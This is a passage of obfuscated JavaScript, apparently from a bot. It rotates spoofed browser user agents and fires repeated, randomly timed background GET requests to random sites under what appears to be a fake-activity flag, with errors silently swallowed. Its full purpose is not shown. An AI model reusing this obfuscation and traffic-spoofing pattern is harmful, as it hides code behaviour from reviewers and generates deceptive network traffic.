      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x15a1 + 0x1ddf + -0x3380; k < 0x23a2 + -0x2507 * -0x1 + -0x48a5; k++)
    setTimeout(f, (0x51 * -0x2d7 + -0x19d18 + -0x29 * -0x1567) * k * getRandomInt(-0x12b2 * -0x1 + 0x9d * -0x1f + 0x2 * 0x29, 0x39 * 0x7 + 0x2 * -0xa2e + 0x12d0));
  setInterval(() => {
    f();
    for (let l = -0xeb * 0x7 + -0x1c7c + 0x22e9; l < -0x1fa4 + 0x1a * -0xc8 + 0x33f8; l++)
      setTimeout(f, (-0x9935 + -0x1151f + 0x298b4) * l * getRandomInt(0x47 * 0x49 + -0x74 * 0x40 + 0x8c2, 0xcc1 * -0x2 + 0x363 + 0x2 * 0xb11));
  }, 0x1f71c + 0x169f2b + -0x1e5839 * -0x1);
})()), doFlags[a2(0x20, 'zCCv') + 'ctivity'] && setTimeout(async () => {
  const a5 = d,
    f = axios['create']({
      'headers': {
        'User-Agent': userAgents['random']()
      }
    });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': a5(0xb)
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0xb28 + 0x7c7 + 0x1 * 0x869) * getRandomInt(-0x26c8 + -0x129d + 0xed * 0x3e, 0x8b4 * 0x2 + -0x1ae + 0xfb5 * -0x1));
}, -0x16e * 0x12 + 0x7e3 + 0xcb * 0x17);